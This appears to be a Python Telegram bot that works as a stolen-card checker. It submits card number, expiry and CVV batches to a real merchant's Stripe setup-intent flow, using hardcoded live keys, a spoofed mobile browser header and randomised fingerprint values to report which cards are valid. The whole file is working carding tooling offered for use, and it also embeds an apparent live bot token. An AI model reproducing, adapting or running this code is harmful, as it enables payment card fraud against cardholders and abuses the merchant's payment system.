import telebot
import requests
import time
import re
import random
import string

BOT_TOKEN = "7018443911:AAFP7YgMlc03URuqMUv-_VzysmewC0vt8jM"
bot = telebot.TeleBot(BOT_TOKEN)

CREATE_SETUP_URL = "https://joeyyaponline.com/api/non_oauth/stripe_intents/setup_intents/create"
STRIPE_CONFIRM_BASE = "https://api.stripe.com/v1/setup_intents/"

def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{username}@gmail.com"

def parse_card(card_text):
    pattern = r"(\d+)\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})"
    match = re.match(pattern, card_text.strip())
    if not match:
        return None
    
    cc, mm, yy, cvv = match.groups()
    mm = mm.zfill(2)
    if len(yy) == 4:
        yy = yy[2:]
    return cc, mm, yy, cvv

def get_client_secret():
    headers = {
        "content-type": "application/json",
        "accept": "application/json",
        "origin": "https://joeyyaponline.com",
        "referer": "https://joeyyaponline.com/upgrade-destiny",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
    }
    
    payload = {
        "page_id": "VDJ6UUp0RXFXMit5cWhxOTlDSmk4UT09LS1SVUU0Q1NxM1h1eXpCZFVnWVBkWjlRPT0=--07073233beb4b40b3427c676a21d25e76e93724c",
        "stripe_publishable_key": "pk_live_ZhQji4KQ5kjgRl2R7iYRBoa800GNYZFYxh",
        "stripe_account_id": "acct_1Gf1cmLjuZ01sHDd"
    }
    
    try:
        response = requests.post(CREATE_SETUP_URL, headers=headers, json=payload)
        return response.json().get("client_secret")
    except Exception as e:
        return None

def check_card(cc, mm, yy, cvv, client_secret):
    if not client_secret:
        return "❌ Failed to get client secret"
    
    setup_intent_id = client_secret.split("_secret_")[0]
    confirm_url = f"{STRIPE_CONFIRM_BASE}{setup_intent_id}/confirm"
    
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "accept": "application/json",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
    }
    
    data = {
        "payment_method_data[type]": "card",
        "payment_method_data[billing_details][email]": generate_random_email(),
        "payment_method_data[card][number]": cc,
        "payment_method_data[card][cvc]": cvv,
        "payment_method_data[card][exp_month]": mm,
        "payment_method_data[card][exp_year]": yy,
        "payment_method_data[guid]": ''.join(random.choices(string.hexdigits, k=32)).lower(),
        "payment_method_data[muid]": ''.join(random.choices(string.hexdigits, k=32)).lower(),
        "payment_method_data[sid]": ''.join(random.choices(string.hexdigits, k=32)).lower(),
        "payment_method_data[pasted_fields]": "number",
        "payment_method_data[payment_user_agent]": "stripe.js/ca98f11090; stripe-js-v3/ca98f11090; card-element",
        "payment_method_data[referrer]": "https://joeyyaponline.com",
        "payment_method_data[time_on_page]": str(random.randint(10000, 99999)),
        "expected_payment_method_type": "card",
        "use_stripe_sdk": "true",
        "key": "pk_live_ZhQji4KQ5kjgRl2R7iYRBoa800GNYZFYxh",
        "_stripe_account": "acct_1Gf1cmLjuZ01sHDd",
        "client_secret": client_secret
    }
    
    try:
        response = requests.post(confirm_url, headers=headers, data=data)
        result = response.json()
        
        status = result.get("status", "")
        error = result.get("error", {})
        country = result.get("payment_method", {}).get("card", {}).get("country", "N/A")
        
        return (
            f"Status: {status}\n"
            f"Country: {country}\n"
            f"Code: {error.get('code', '')}\n"
            f"Decline Code: {error.get('decline_code', '')}\n"
            f"Message: {error.get('message', '')}"
        )
        
    except Exception as e:
        return f"❌ Error: {str(e)}"

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 JoeyYap Card Checker Bot\n"
        "Send cards in format:\n"
        "CC|MM|YY|CVV or CC|MM|YYYY|CVV\n\n"
        "Example:\n"
        "4985031119840029|02|29|566\n"
        "4242424242424242|04|2026|123"
    )

@bot.message_handler(func=lambda message: True)
def card_handler(message):
    cards = message.text.strip().split('\n')
    for card_text in cards:
        parsed = parse_card(card_text)
        if not parsed:
            bot.send_message(message.chat.id, f"❌ Invalid format: {card_text}")
            continue
            
        cc, mm, yy, cvv = parsed
        client_secret = get_client_secret()
        result = check_card(cc, mm, yy, cvv, client_secret)
        bot.send_message(message.chat.id, f"Card: {cc}|{mm}|{yy}|{cvv}\n{result}")
        time.sleep(10)

bot.infinity_polling()